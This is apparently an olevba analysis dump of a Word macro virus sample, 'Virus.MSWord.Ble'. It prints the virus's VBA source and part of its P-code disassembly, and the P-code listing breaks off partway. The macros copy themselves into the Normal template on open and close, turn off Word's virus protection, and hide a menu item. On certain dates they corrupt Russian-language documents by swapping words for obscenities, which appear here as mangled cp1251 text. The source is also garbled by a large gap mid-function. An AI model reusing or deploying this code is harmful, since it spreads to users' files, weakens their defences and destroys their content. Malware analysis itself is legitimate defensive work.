olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ble
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ble - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MacroBle.bas 
in file: Virus.MSWord.Ble - OLE stream: 'Macros/VBA/MacroBle'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public myname$
Public Changed As Boolean
Public sz As Long
Public k As Long
Public NoSpecial As Boolean
Option Base 1
Dim ends$(2, 12)
Dim Moora1$(40)
Dim Moora2$(10)
Dim Bls$(3)



Sub AutoOpen()
Attribute AutoOpen.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.AutoOpen"
 On Error GoTo 1
 myname$ = "MacroBle"
 WordBasic.DisableAutoMacros 0
 
 If Not CheckNormal Then
  Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=myname$, Object:=wdOrganizerObjectProjectItems
  Set mytemp = NormalTemplate.OpenAsDocument
  mytemp.SaveAs (GetPath$ + "NORMAL1.DOT")
  mytemp.Close SaveChanges:=wdSaveChanges
End If
GoTo 2
1:
 'MsgBox "Fuck up !"
 Resume 2
2:
 RunOtherMacro MacN:="AutoOpen"
End Sub
Function CheckNormal()
 cn = False
 For Each x In NormalTemplate.VBProject.VBComponents
  If x.Name = myname$ Then cn = True
 Next
 CheckNormal = cn
End Function
Sub RunOtherMacro(MacN As String)
 On Error GoTo Run_Error
 For Each Mac In ActiveDocument.VBProject.VBComponents
   If (Mac.Type = 1) And (Mac.Name <> "MacroBle") Then
    Application.Run "project." + Mac.Name + "." + MacN
Skip_Error:
   End If
  Next Mac
 GoTo End_Run
Run_Error:
 Resume Skip_Error
End_Run:

End Sub

Function CheckActive()
 cn = False
 For Each x In ActiveDocument.VBProject.VBComponents
  If x.Name = myname$ Then cn = True
 Next
 CheckActive = cn
 End Function

Sub AutoClose()
Attribute AutoClose.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.AutoClose"
 On Error GoTo errorlevel2
 If Not CheckActive Then Application.OrganizerCopy Source:=GetPath$ + "NORMAL1.DOT", Destination:=ActiveDocument.FullName, Name:=myname$, Object:=wdOrganizerObjectProjectItems
 If MyDate Then Optimize
 GoTo end_f
errorlevel2:
 'MsgBox "More Errors !"
 Resume end_f
end_f:
 RunOtherMacro MacN:="AutoClose"
End Sub

Function GetPath$()
 s$ = NormalTemplate.FullName
 s$ = Mid$(s$, 1, Len(s$) - 10)
 GetPath$ = s$
End Function

Sub AutoExec()
Attribute AutoExec.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.AutoExec"
 Options.VirusProtection = False
 Set x = CommandBars("Tools").Controls(12)
 x.Visible = False
 x.Enabled = False
 ends$(1, 1) = "ûé"
 ends$(1, 2) = "îãî"
 ends$(1, 3) = "îìó"
 ends$(1, 4) = "ûì"
 ends$(1, 5) = "îì"
 ends$(1, 6) = "àÿ"
 ends$(1, 7) = "îé"
 ends$(1, 8) = "óþ"
 ends$(1, 9) = "ûå"
 ends$(1, 10) = "ûõ"
 ends$(1, 11) = "ûìè"
 ends$(1, 12) = "îå"
 ends$(2, 1) = "èé"
 ends$(2, 2) = "åãî"
 ends$(2, 3) = "åìó"
 ends$(2, 4) = "èì"
 ends$(2, 5) = "åì"
 ends$(2, 6) = "åé"
 ends$(2, 7) = "èå"
 ends$(2, 8) = "èõ"
 ends$(2, 9) = "èì"
 ends$(2, 10) = "èìè"
 ends$(2, 11) = "åå"
 ends$(2, 12) = "àÿ"
 
 Moora1$(1) = "õóåâ"
 Moora1$(2) = "åáàíóò"
 Moora1$(3) = "ãîíèì"
 Moora1$(4) = "äåáèëüí"
 Moora1$(5) = "ìóäà÷í"
 Moora1$(6) = "õðåíîâ"
 Moora1$(7) = "äóáîâ"
 Moora1$(8) = "ñîïëèâ"
 Moora1$(9) = "êîðÿâ"
 Moora1$(10) = "óáëþäî÷í"
 
 Moora1$(11) = "ïåäðèëüí"
 Moora1$(12) = "ãîâíÿí"
 Moora1$(13) = "êîçëèí"
 Moora1$(14) = "åáëèâ"
 Moora1$(15) = "åáàí"
 Moora1$(16) = "ïèçäàíóò"
 Moora1$(17) = "ïðèäóðîøí"
 Moora1$(18) = "øèçàíóò"
 Moora1$(19) = "ãíóñí"
 Moora1$(20) = "ñòðåìí"
 
 Moora1$(21) = "ãíóñàâ"
 Moora1$(22) = "òóïîðûë"
 Moora1$(23) = "êàíàëèçàöèîíí"
 Moora1$(24) = "âèçãëèâ"
 Moora1$(25) = "ñëåïîøàð"
 Moora1$(26) = "ïðûùàâ"
 Moora1$(27) = "ðâîòí"
 Moora1$(28) = "ñêëî÷í"
 Moora1$(29) = "óðîäëèâ"
 Moora1$(30) = "áîðîäàâî÷í"
 
 Moora1$(31) = "îáñòðóõàíí"
 Moora1$(32) = "íåíîðìàëüí"
 Moora1$(33) = "ïëþãàâ"
 Moora1$(34) = "êîñÿ÷í"
 Moora1$(35) = ""
 Moora1$(36) = ""
 Moora1$(37) = ""
 Moora1$(38) = ""
 Moora1$(39) = ""
 Moora1$(40) = ""

 Moora2$(1) = "ñâèíÿ÷"
 Moora2$(2) = "îõóåâø"
 Moora2$(3) = "âîíþ÷"
 Moora2$(4) = "îõóåâàþù"
 Moora2$(5) = ""
 Moora2$(6) = ""
 Moora2$(7) = ""
 Moora2$(8) = ""
 Moora2$(9) = ""
 Moora2$(10) = ""
 
 Bls$(1) = "áëÿ"
 Bls$(2) = "â íàòóðå"
 Bls$(3) = "òâîþ ìàòü"
 
End Sub

Sub Optimize()
Attribute Optimize.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute Optimize.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.MakeSoviet"
 AutoExec
 Randomize Timer
 f = System.LanguageDesignation
 If UCase$(Mid$(f, 1, 3)) = "ÐÓÑ" Then
  sz = ActiveDocument.Words.Count
  Changed = False
  Optima = 0
  If sz <= 500 Then
   For k = 1 To sz
    tss$ = ActiveDocument.Words.Item(k)
    Application.StatusBar = "Ïîäãîòîâêà ê ñîõðàíåíèþ: " + Str$(k \ 5) + "%"
    If Len(tss$) > 4 Then GoSub Do_Trunslate
   Next k
  Else
   li = 1
   While li < 100
    k = Int(sz * Rnd + 1)
    tss$ = ActiveDocument.Words.Item(k)
    If Len(tss$) > 4 Then
     GoSub Do_Trunslate
     li = li + 1
     Application.StatusBar = "Ïîäãîòîâêà ê ñîõðàíåíèþ: " + Str$(li) + "%"
    End If
   Wend
  End If
  Application.StatusBar = "Ïîäãîòîâêà çàâåðøåíà. Îïòèìèçàöèÿ: " + Str$(Optima) + "%"
 End If
  GoTo end_proc
  
Do_Trunslate:
   tss$ = TrunslateWord(tss$)
   If Changed Then
    ActiveDocument.Words(k) = tss$
    Changed = False
    Optima = Optima + 1
   End If
  Return
end_proc:
End Sub

Function TrunslateWord$(ts As String)
 tw$ = ts
 spaces = CheckSpace(ts)
 If spaces <> 0 Then ts = Mid$(ts, 1, Len(ts) - spaces)
 Lts = Len(ts)
 If Lts > 4 Then
  If CheckAdjective(ts) Then
   c = 1
   While c <= 2
    i = 1
    While i <= 12
     CEnd$ = ends$(c, i)
     MyEnd$ = Mid$(ts, Lts - Len(CEnd$) + 1, Len(CEnd$))
     If MyEnd$ = CEnd$ Then
      Changed = True
      Select Case c
       Case 1
        tw$ = Moora1$(Int(34 * Rnd + 1)) + CEnd$
       Case 2
        tw$ = Moora2$(Int(3 * Rnd + 1)) + CEnd$
      End Select
      If spaces <> 0 Then tw$ = tw$ + Space(spaces)
      FLett = Mid$(ts, 1, 1)
      If UCase$(FLett) = FLett Then tw$ = UCase$(Mid$(tw$, 1, 1)) + Mid$(tw$, 2, Len(tw$) - 1)
      i = 12
      c = 2
     End If
     i = i + 1
    Wend
    c = c + 1
   Wend
  End If
 End If
 TrunslateWord$ = tw$
End Function

Function CheckSpace(csp As String) As Integer
 spp = 0
 n = Len(csp)
 If n > 3 Then
  While (Mid$(csp, n, 1) = " ") And (n > 3)
   n = n - 1
   spp = spp + 1
  Wend
 End If
 CheckSpace = spp
End Function


Function MyDate() As Boolean
 dt$ = Date$
 If InStr(1, dt$, "15") <> 0 Then MyDate = True Else MyDate = False
End Function


Function CheckAdjective(adj As String) As Boolean
 cadj = False
 NoSpecial = True
 atj$ = LCase$(Mid$(adj, 1, 5))
 Select Case atj$
  Case "åæåäí"
   NoSpecial = False
  Case "àäàïò"
   NoSpecial = False
  Case "óðîâí"
   NoSpecial = False
  Case "íàñèë"
   NoSpecial = False
 End Select
 If NoFuckenError(atj$) Then
  Set mySynInfo = SynonymInfo(adj)
  myPos = mySynInfo.PartOfSpeechList
  i = UBound(myPos)
  If i >= 1 Then If myPos(1) = wdAdjective Then cadj = True
 End If
 CheckAdjective = cadj
End Function

Function NoFuckenError(wrd As String) As Boolean
 atj = Mid$(wrd, 1, 1)
 Select Case atj
  Case "î"
   NoSpecial = False
  Case "ï"
   NoSpecial = False
  Case "ð"
   NoSpecial = False
  Case "ñ"
   NoSpecial = False
  Case "ò"
   NoSpecial = False
  Case "â"
   NoSpecial = False
  Case "ë"
   NoSpecial = False
  Case "ì"
   NoSpecial = False
  Case "ç"
   NoSpecial = False
  Case "÷"
   NoSpecial = False











































  sz = ActiveDocument.Words.Count
  If sz > 500 Then
   For i = 1 To 50
    Application.StatusBar = "Ïîäãîòîâêà: " + Str$(i * 2)
    k = Int((sz - 1) * Rnd + 1)
    tss$ = RTrim(ActiveDocument.Words(k))
    If Len(tss$) > 4 Then
     tss1$ = RTrim(ActiveDocument.Words(k + 1))
     If Len(tss1$) > 4 Then
     If Int(3 * Rnd + 1) = 1 Then
      blya$ = ", " + Bls$(Int(3 * Rnd + 1)) + ", "
      ActiveDocument.Words(k).InsertAfter (blya$)
     End If
     End If
    End If
   Next i
   Application.StatusBar = "Ãîòîâî."
  End If
 End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ble
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/MacroBle - 16079 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn myname
' Line #1:
' 	Dim (Public) 
' 	VarDefn Changed (As Boolean)
' Line #2:
' 	Dim (Public) 
' 	VarDefn sz (As Long)
' Line #3:
' 	Dim (Public) 
' 	VarDefn k (As Long)
' Line #4:
' 	Dim (Public) 
' 	VarDefn NoSpecial (As Boolean)
' Line #5:
' 	Option  (Base 1)
' Line #6:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0002 
' 	OptionBase 
' 	LitDI2 0x000C 
' 	VarDefn ends
' Line #7:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0028 
' 	VarDefn Moora1
' Line #8:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x000A 
' 	VarDefn Moora2
' Line #9:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0003 
' 	VarDefn Bls
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' 	FuncDefn (Sub AutoOpen())
' Line #14:
' 	OnError 1 
' Line #15:
' 	LitStr 0x0008 "MacroBle"
' 	St myname$ 
' Line #16:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #17:
' Line #18:
' 	Ld CheckNormal 
' 	Not 
' 	IfBlock 
' Line #19:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld myname$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #20:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd OpenAsDocument 
' 	Set mytemp 
' Line #21:
' 	Ld GetPath$ 
' 	LitStr 0x000B "NORMAL1.DOT"
' 	Add 
' 	Paren 
' 	Ld mytemp 
' 	ArgsMemCall SaveAs 0x0001 
' Line #22:
' 	Ld wdSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld mytemp 
' 	ArgsMemCall Close 0x0001 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	GoTo 2 
' Line #25:
' 	LineNum 1 
' 	BoS 0x0000 
' Line #26:
' 	QuoteRem 0x0001 0x0012 "MsgBox "Fuck up !""
' Line #27:
' 	Resume 2 
' Line #28:
' 	LineNum 2 
' 	BoS 0x0000 
' Line #29:
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed MacN 
' 	ArgsCall RunOtherMacro 0x0001 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Function CheckNormal())
' Line #32:
' 	LitVarSpecial (False)
' 	St cn 
' Line #33:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #34:
' 	Ld x 
' 	MemLd New 
' 	Ld myname$ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St cn 
' 	EndIf 
' Line #35:
' 	StartForVariable 
' 	Next 
' Line #36:
' 	Ld cn 
' 	St CheckNormal 
' Line #37:
' 	EndFunc 
' Line #38:
' 	FuncDefn (Sub RunOtherMacro(MacN As String))
' Line #39:
' 	OnError Run_Error 
' Line #40:
' 	StartForVariable 
' 	Ld Mac 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #41:
' 	Ld Mac 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Ld Mac 
' 	MemLd New 
' 	LitStr 0x0008 "MacroBle"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #42:
' 	LitStr 0x0008 "project."
' 	Ld Mac 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	Ld MacN 
' 	Add 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #43:
' 	Label Skip_Error 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	StartForVariable 
' 	Ld Mac 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	GoTo End_Run 
' Line #47:
' 	Label Run_Error 
' Line #48:
' 	Resume Skip_Error 
' Line #49:
' 	Label End_Run 
' Line #50:
' Line #51:
' 	EndSub 
' Line #52:
' Line #53:
' 	FuncDefn (Function CheckActive())
' Line #54:
' 	LitVarSpecial (False)
' 	St cn 
' Line #55:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #56:
' 	Ld x 
' 	MemLd New 
' 	Ld myname$ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St cn 
' 	EndIf 
' Line #57:
' 	StartForVariable 
' 	Next 
' Line #58:
' 	Ld cn 
' 	St CheckActive 
' Line #59:
' 	EndFunc 
' Line #60:
' Line #61:
' 	FuncDefn (Sub AutoClose())
' Line #62:
' 	OnError errorlevel2 
' Line #63:
' 	Ld CheckActive 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld GetPath$ 
' 	LitStr 0x000B "NORMAL1.DOT"
' 	Add 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld myname$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' 	EndIf 
' Line #64:
' 	Ld MyDate 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Optimize 0x0000 
' 	EndIf 
' Line #65:
' 	GoTo end_f 
' Line #66:
' 	Label errorlevel2 
' Line #67:
' 	QuoteRem 0x0001 0x0016 "MsgBox "More Errors !""
' Line #68:
' 	Resume end_f 
' Line #69:
' 	Label end_f 
' Line #70:
' 	LitStr 0x0009 "AutoClose"
' 	ParamNamed MacN 
' 	ArgsCall RunOtherMacro 0x0001 
' Line #71:
' 	EndSub 
' Line #72:
' Line #73:
' 	FuncDefn (Function GetPath())
' Line #74:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St s$ 
' Line #75:
' 	Ld s$ 
' 	LitDI2 0x0001 
' 	Ld s$ 
' 	FnLen 
' 	LitDI2 0x000A 
' 	Sub 
' 	ArgsLd Mid$$ 0x0003 
' 	St s$ 
' Line #76:
' 	Ld s$ 
' 	St GetPath$ 
' Line #77:
' 	EndFunc 
' Line #78:
' Line #79:
' 	FuncDefn (Sub AutoExec())
' Line #80:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #81:
' 	SetStmt 
' 	LitDI2 0x000C 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	Set x 
' Line #82:
' 	LitVarSpecial (False)
' 	Ld x 
' 	MemSt Visible 
' Line #83:
' 	LitVarSpecial (False)
' 	Ld x 
' 	MemSt Enabled 
' Line #84:
' 	LitStr 0x0002 "ûé"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsSt ends$ 0x0002 
' Line #85:
' 	LitStr 0x0003 "îãî"
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsSt ends$ 0x0002 
' Line #86:
' 	LitStr 0x0003 "îìó"
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	ArgsSt ends$ 0x0002 
' Line #87:
' 	LitStr 0x0002 "ûì"
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	ArgsSt ends$ 0x0002 
' Line #88:
' 	LitStr 0x0002 "îì"
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	ArgsSt ends$ 0x0002 
' Line #89:
' 	LitStr 0x0002 "àÿ"
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	ArgsSt ends$ 0x0002 
' Line #90:
' 	LitStr 0x0002 "îé"
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	ArgsSt ends$ 0x0002 
' Line #91:
' 	LitStr 0x0002 "óþ"
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	ArgsSt ends$ 0x0002 
' Line #92:
' 	LitStr 0x0002 "ûå"
' 	LitDI2 0x0001 
' 	LitDI2 0x0009 
' 	ArgsSt ends$ 0x0002 
' Line #93:
' 	LitStr 0x0002 "ûõ"
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	ArgsSt ends$ 0x0002 
' Line #94:
' 	LitStr 0x0003 "ûìè"
' 	LitDI2 0x0001 
' 	LitDI2 0x000B 
' 	ArgsSt ends$ 0x0002 
' Line #95:
' 	LitStr 0x0002 "îå"
' 	LitDI2 0x0001 
' 	LitDI2 0x000C 
' 	ArgsSt ends$ 0x0002 
' Line #96:
' 	LitStr 0x0002 "èé"
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsSt ends$ 0x0002 
' Line #97:
' 	LitStr 0x0003 "åãî"
' 	LitDI2 0x0002 
' 	LitDI2 0x0002 
' 	ArgsSt ends$ 0x0002 
' Line #98:
' 	LitStr 0x0003 "åìó"
' 	LitDI2 0x0002 
' 	LitDI2 0x0003 
' 	ArgsSt ends$ 0x0002 
' Line #99:
' 	LitStr 0x0002 "èì"
' 	LitDI2 0x0002 
' 	LitDI2 0x0004 
' 	ArgsSt ends$ 0x0002 
' Line #100:
' 	LitStr 0x0002 "åì"
' 	LitDI2 0x0002 
' 	LitDI2 0x0005 
' 	ArgsSt ends$ 0x0002 
' Line #101:
' 	LitStr 0x0002 "åé"
' 	LitDI2 0x0002 
' 	LitDI2 0x0006 
' 	ArgsSt ends$ 0x0002 
' Line #102:
' 	LitStr 0x0002 "èå"
' 	LitDI2 0x0002 
' 	LitDI2 0x0007 
' 	ArgsSt ends$ 0x0002 
' Line #103:
' 	LitStr 0x0002 "èõ"
' 	LitDI2 0x0002 
' 	LitDI2 0x0008 
' 	ArgsSt ends$ 0x0002 
' Line #104:
' 	LitStr 0x0002 "èì"
' 	LitDI2 0x0002 
' 	LitDI2 0x0009 
' 	ArgsSt ends$ 0x0002 
' Line #105:
' 	LitStr 0x0003 "èìè"
' 	LitDI2 0x0002 
' 	LitDI2 0x000A 
' 	ArgsSt ends$ 0x0002 
' Line #106:
' 	LitStr 0x0002 "åå"
' 	LitDI2 0x0002 
' 	LitDI2 0x000B 
' 	ArgsSt ends$ 0x0002 
' Line #107:
' 	LitStr 0x0002 "àÿ"
' 	LitDI2 0x0002 
' 	LitDI2 0x000C 
' 	ArgsSt ends$ 0x0002 
' Line #108:
' Line #109:
' 	LitStr 0x0004 "õóåâ"
' 	LitDI2 0x0001 
' 	ArgsSt Moora1$ 0x0001 
' Line #110:
' 	LitStr 0x0006 "åáàíóò"
' 	LitDI2 0x0002 
' 	ArgsSt Moora1$ 0x0001 
' Line #111:
' 	LitStr 0x0005 "ãîíèì"
' 	LitDI2 0x0003 
' 	ArgsSt Moora1$ 0x0001 
' Line #112:
' 	LitStr 0x0007 "äåáèëüí"
' 	LitDI2 0x0004 
' 	ArgsSt Moora1$ 0x0001 
' Line #113:
' 	LitStr 0x0006 "ìóäà÷í"
' 	LitDI2 0x0005 
' 	ArgsSt Moora1$ 0x0001 
' Line #114:
' 	LitStr 0x0006 "õðåíîâ"
' 	LitDI2 0x0006 
' 	ArgsSt Moora1$ 0x0001 
' Line #115:
' 	LitStr 0x0005 "äóáîâ"
' 	LitDI2 0x0007 
' 	ArgsSt Moora1$ 0x0001 
' Line #116:
' 	LitStr 0x0006 "ñîïëèâ"
' 	LitDI2 0x0008 
' 	ArgsSt Moora1$ 0x0001 
' Line #117:
' 	LitStr 0x0005 "êîðÿâ"
' 	LitDI2 0x0009 
' 	ArgsSt Moora1$ 0x0001 
' Line #118:
' 	LitStr 0x0008 "óáëþäî÷í"
' 	LitDI2 0x000A 
' 	ArgsSt Moora1$ 0x0001 
' Line #119:
' Line #120:
' 	LitStr 0x0008 "ïåäðèëüí"
' 	LitDI2 0x000B 
' 	ArgsSt Moora1$ 0x0001 
' Line #121:
' 	LitStr 0x0006 "ãîâíÿí"
' 	LitDI2 0x000C 
' 	ArgsSt Moora1$ 0x0001 
' Line #122:
' 	LitStr 0x0006 "êîçëèí"
' 	LitDI2 0x000D 
' 	ArgsSt Moora1$ 0x0001 
' Line #123:
' 	LitStr 0x0005 "åáëèâ"
' 	LitDI2 0x000E 
' 	ArgsSt Moora1$ 0x0001 
' Line #124:
' 	LitStr 0x0004 "åáàí"
' 	LitDI2 0x000F 
' 	ArgsSt Moora1$ 0x0001 
' Line #125:
' 	LitStr 0x0008 "ïèçäàíóò"
' 	LitDI2 0x0010 
' 	ArgsSt Moora1$ 0x0001 
' Line #126:
' 	LitStr 0x0009 "ïðèäóðîøí"
' 	LitDI2 0x0011 
' 	ArgsSt Moora1$ 0x0001 
' Line #127:
' 	LitStr 0x0007 "øèçàíóò"
' 	LitDI2 0x0012 
' 	ArgsSt Moora1$ 0x0001 
' Line #128:
' 	LitStr 0x0005 "ãíóñí"
' 	LitDI2 0x0013 
' 	ArgsSt Moora1$ 0x0001 
' Line #129:
' 	LitStr 0x0006 "ñòðåìí"
' 	LitDI2 0x0014 
' 	ArgsSt Moora1$ 0x0001 
' Line #130:
' Line #131:
' 	LitStr 0x0006 "ãíóñàâ"
' 	LitDI2 0x0015 
' 	ArgsSt Moora1$ 0x0001 
' Line #132:
' 	LitStr 0x0007 "òóïîðûë"
' 	LitDI2 0x0016 
' 	ArgsSt Moora1$ 0x0001 
' Line #133:
' 	LitStr 0x000D "êàíàëèçàöèîíí"
' 	LitDI2 0x0017 
' 	ArgsSt Moora1$ 0x0001 
' Line #134:
' 	LitStr 0x0007 "âèçãëèâ"
' 	LitDI2 0x0018 
' 	ArgsSt Moora1$ 0x0001 
' Line #135:
' 	LitStr 0x0008 "ñëåïîøàð"
' 	LitDI2 0x0019 
' 	ArgsSt Moora1$ 0x0001 
' Line #136:
' 	LitStr 0x0006 "ïðûùàâ"
' 	LitDI2 0x001A 
' 	ArgsSt Moora1$ 0x0001 
' Line #137:
' 	LitStr 0x0005 "ðâîòí"
' 	LitDI2 0x001B 
' 	ArgsSt Moora1$ 0x0001 
' Line #138:
' 	LitStr 0x0006 "ñêëî÷í"
' 	LitDI2 0x001C 
' 	ArgsSt Moora1$ 0x0001 
' Line #139:
' 	LitStr 0x0007 "óðîäëèâ"
' 	LitDI2 0x001D 
' 	ArgsSt Moora1$ 0x0001 
' Line #140:
' 	LitStr 0x000A "áîðîäàâî÷í"
' 	LitDI2 0x001E 
' 	ArgsSt Moora1$ 0x0001 
' Line #141:
' Line #142:
' 	LitStr 0x000A "îáñòðóõàíí"
' 	LitDI2 0x001F 
' 	ArgsSt Moora1$ 0x0001 
' Line #143:
' 	LitStr 0x000A "íåíîðìàëüí"
' 	LitDI2 0x0020 
' 	ArgsSt Moora1$ 0x0001 
' Line #144:
' 	LitStr 0x0006 "ïëþãàâ"
' 	LitDI2 0x0021 
' 	ArgsSt Moora1$ 0x0001 
' Line #145:
' 	LitStr 0x0006 "êîñÿ÷í"
' 	LitDI2 0x0022 
' 	ArgsSt Moora1$ 0x0001 
' Line #146:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0023 
' 	ArgsSt Moora1$ 0x0001 
' Line #147:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0024 
' 	ArgsSt Moora1$ 0x0001 
' Line #148:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0025 
' 	ArgsSt Moora1$ 0x0001 
' Line #149:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0026 
' 	ArgsSt Moora1$ 0x0001 
' Line #150:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0027 
' 	ArgsSt Moora1$ 0x0001 
' Line #151:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0028 
' 	ArgsSt Moora1$ 0x0001 
' Line #152:
' Line #153:
' 	LitStr 0x0006 "ñâèíÿ÷"
' 	LitDI2 0x0001 
' 	ArgsSt Moora2$ 0x0001 
' Line #154:
' 	LitStr 0x0006 "îõóåâø"
' 	LitDI2 0x0002 
' 	ArgsSt Moora2$ 0x0001 
' Line #155:
' 	LitStr 0x0005 "âîíþ÷"
' 	LitDI2 0x0003 
' 	ArgsSt Moora2$ 0x0001 
' Line #156:
' 	LitStr 0x0008 "îõóåâàþù"
' 	LitDI2 0x0004 
' 	ArgsSt Moora2$ 0x0001 
' Line #157:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0005 
' 	ArgsSt Moora2$ 0x0001 
' Line #158:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0006 
' 	ArgsSt Moora2$ 0x0001 
' Line #159:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0007 
' 	ArgsSt Moora2$ 0x0001 
' Line #160:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0008 
' 	ArgsSt Moora2$ 0x0001 
' Line #161:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0009 
' 	ArgsSt Moora2$ 0x0001 
' Line #162:
' 	LitStr 0x0000 ""
' 	LitDI2 0x000A 
' 	ArgsSt Moora2$ 0x0001 
' Line #163:
' Line #164:
' 	LitStr 0x0003 "áëÿ"
' 	LitDI2 0x0001 
' 	ArgsSt Bls$ 0x0001 
' Line #165:
' 	LitStr 0x0008 "â íàòóðå"
' 	LitDI2 0x0002 
' 	ArgsSt Bls$ 0x0001 
' Line #166:
' 	LitStr 0x0009 "òâîþ ìàòü"
' 	LitDI2 0x0003 
' 	ArgsSt Bls$ 0x0001 
' Line #167:
' Line #168:
' 	EndSub 
' Line #169:
' Line #170:
' 	FuncDefn (Sub Optimize())
' Line #171:
' 	ArgsCall AutoExec 0x0000 
' Line #172:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #173:
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	St False 
' Line #174:
' 	Ld False 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd UCase$ 0x0001 
' 	LitStr 0x0003 "ÐÓÑ"
' 	Eq 
' 	IfBlock 
' Line #175:
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	MemLd Count 
' 	St sz 
' Line #176:
' 	LitVarSpecial (False)
' 	St Changed 
' Line #177:
' 	LitDI2 0x0000 
' 	St Optima 
' Line #178:
' 	Ld sz 
' 	LitDI2 0x01F4 
' 	Le 
' 	IfBlock 
' Line #179:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld sz 
' 	For 
' Line #180:
' 	Ld k 
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	ArgsMemLd Item 0x0001 
' 	St tss$ 
' Line #181:
' 	LitStr 0x0019 "Ïîäãîòîâêà ê ñîõðàíåíèþ: "
' 	Ld k 
